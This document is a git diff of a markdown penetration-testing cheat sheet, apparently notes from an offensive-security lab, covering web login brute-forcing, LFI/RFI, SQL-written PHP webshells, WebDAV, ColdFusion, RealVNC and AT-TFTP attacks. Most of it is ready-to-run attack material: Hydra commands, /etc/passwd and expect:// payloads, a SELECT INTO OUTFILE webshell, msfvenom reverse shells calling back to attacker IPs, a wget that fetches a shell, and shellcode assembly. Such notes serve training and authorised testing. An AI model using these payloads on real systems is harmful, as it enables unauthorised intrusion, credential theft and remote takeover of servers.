@@ -1,4 +1,4 @@
-## Web Login form Brutefocing 
+## Web Login Form Brutefocing 
 HTTP Hydra	
 ```sh
 hydra -l admin -P /usr/share/wordlist/SecList/Passwords/10k_most_common.txt 192.168.88.162 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
@@ -58,7 +58,7 @@ nikto -C all -h http://10.11.1.72"
 
 
 ## - **LFI(Local File Inclusion)** <br />
-lfisuite.py
+lfisuite.py 
 eg. 
 ```sh
 browse.php?file=php://filter/convert.base64-encode/resource=ini.php
@@ -68,7 +68,25 @@ browse.php?file=/etc/passwd
 index.php?file=
 ```
 If target has phpinfo.php, check out "file_uploads", see if appears as enabled(ON); if so, the target is vuln for LFI. 
+## - **Uplaoding malicious  .php file on database** <br />
+ref : http://hackingandsecurity.blogspot.com/2017/08/proj-12-exploiting-php-vulnerabilities.html
+SQL-phpshellscript : create below malicious (shell).php script on DB
+```sh
+Windows : SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\shell.php"
+Linux : SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
+```
+After uploading above maclious php webshell, browse to the page with command, eg. http://192.168.1.101/DBlocation/shell.php?cmd=ipconfig
 
+
+## - **RFI(Remote File Inclusion)** <br />
+eg.
+```sh
+browse.php?file=http://10.11.0.42/index.html
+browse.php?file=ftp://10.11.0.42/index.html
+browse.php?expect://ls
+```
+gain a shell via phpinfo.php https://office.tuxcon.com/root/web-sec-payloads/src/commit/fd99da6c06e00a596becdcfc6d2efe50bad0f47c/File%20Inclusion%20-%20Path%20Traversal
+ 
 
 ## - **Squid** <br />
 proxy scanner/http/squid_pivot_scanning
@@ -142,56 +160,51 @@ db and password located @ /etc/phpmyadmin/config-db.php and default cred can be;
 You can also bruteforce by ```sh
 hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"```
 
-upload malicious database as .php 
-ref : http://hackingandsecurity.blogspot.com/2017/08/proj-12-exploiting-php-vulnerabilities.html
-SQL-phpshellscript : 
-(1)Once login, clilck SQL and ""Run SQL query/queries on server ""localhost"":"" and provide beblow sql-query to create (shell).php script.
-Windows : SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""C:\\xampp\\htdocs\\shell.php""
-Linux : SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""/var/www/html/shell.php""
-(2) now visit http://192.168.1.101/DBlocation/shell.php?cmd=ipconfig
-(3) if you wanna hav better shell; ?cmd=wget%20192.168.1.102/shell.php"
-CURL | base encode/decode	"curl -s http://192.168.88.168/index.php
-root@kali:~$echo jeff | base64
-amVmZgo=
-root@kali:~$echo -n VXNlcm5hbWU6 |base64 -d
-Username:"
-RFI	"https://github.com/3mrgnc3/LFIter2/blob/master/lfitr2.py
-https://www.youtube.com/watch?v=rs4zEwONzzk
-browse.php?file=http://10.11.0.42/index.html
-browse.php?file=ftp://10.11.0.42/index.html
-browse.php?expect://ls
-gain a shell via phpinfo.php https://office.tuxcon.com/root/web-sec-payloads/src/commit/fd99da6c06e00a596becdcfc6d2efe50bad0f47c/File%20Inclusion%20-%20Path%20Traversal
-phpinfolfi.py or https://github.com/D35m0nd142/Kadabra/blob/master/phpinfo.py
-needs to update the shell and browse.php part etc. 
-instruction : https://www.youtube.com/watch?v=rs4zEwONzzk"
-Webdav 	"nmap -T4 -p80 --script=http-iis-webdav-vuln 10.11.1.229
-cf. auxiliary : webdav_test
-davtest -url http://10.11.1.229
-[webhsell]msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443  -f asp > shells.asp 
-[webhsell]/usr/share/webshells/asp/cmdasp.asp
+
+## - Webdav** <br />
+WebDav Vulnerability Check : ```nmap -T4 -p80 --script=http-iis-webdav-vuln 10.11.1.229```
+auxiliary : ```webdav_test```
+```davtest -url http://10.11.1.229
 cadaver http://10.11.x.x/webdav/
+``` 
+Uploading shells.txt to `shells.txt'
+```sh
 dav:> put shells.txt
-Uploading shells.txt to `shells.txt':
-dav:> copy shells.txt shells.asp;.txt"
-ColdFusion	"Version check : http://example.com/CFIDE/adminapi/base.cfc?wsdl
+dav:> copy shells.txt shells.asp;.txt
+```
+
+## - ColdFusion** <br />
+Version check : http://example.com/CFIDE/adminapi/base.cfc?wsdl
 LFI(passowrd file) : http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 (either - neo-security.xml and password.properties)
-ref * https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
-exploit/windows/http/coldfusion_fckeditor - only for 8.0.1"
+ref : https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+
+exploit/windows/http/coldfusion_fckeditor - only for 8.0.1
+
+## - XAMPP ** <br />
 XAMPP	cred(wampp/xampp)
-RealVNC	"https://www.exploit-db.com/exploits/36932
+
+
+## - RealVNC ** <br />
+RealVNC	: https://www.exploit-db.com/exploits/36932
 Edit, BIND_ADDR into mine and BIND_PORT into 4444
 root@kali:~/PWK-Lab/10.11.1.227$python RealVNC-exploit-36932.py 
 [*] Please input an IP address to pwn: 10.11.1.227
 [*] Hello From Server: RFB 003.008
-Ctrl+Alt+Shift+Del will be vmware's ctrl+alt+del"
+Ctrl+Alt+Shift+Del will be vmware's ctrl+alt+del
+
+
+## - misc** <br />
 Drupal	cred(admin/admin)
 Elastix	"cred(admin/admin) http://example.com/vtigercrm/ 
-You might be able to upload shell in profile-photo."
-SuirrelMail	"https://raw.githubusercontent.com/xl7dev/Exploit/master/SquirrelMail/SquirrelMail_RCE_exploit.sh
-RFI : http://10.11.1.115/webmail/src/read_body.php?mailbox=/etc/passwd&passed_id=1&"
+You might be able to upload shell in profile-photo.
+
+## - SuirrelMail** <br />
+https://raw.githubusercontent.com/xl7dev/Exploit/master/SquirrelMail/SquirrelMail_RCE_exploit.sh
 	
-AT-TFTP 1.9 version	"https://github.com/brianwrf/cve-2006-6184
+## - AT-TFTP** <br />
+ 1.9 version : https://github.com/brianwrf/cve-2006-6184
+ 
 1.perl -e 'print """"\x81\xec\xac\x0d\x00\x00""""' > stackadj
 2.msfvenom -p windows/shell/reverse_nonx_tcp LHOST=10.11.0.37 LPORT=443 R > payload
 3.cat stackadj payload > shellcode
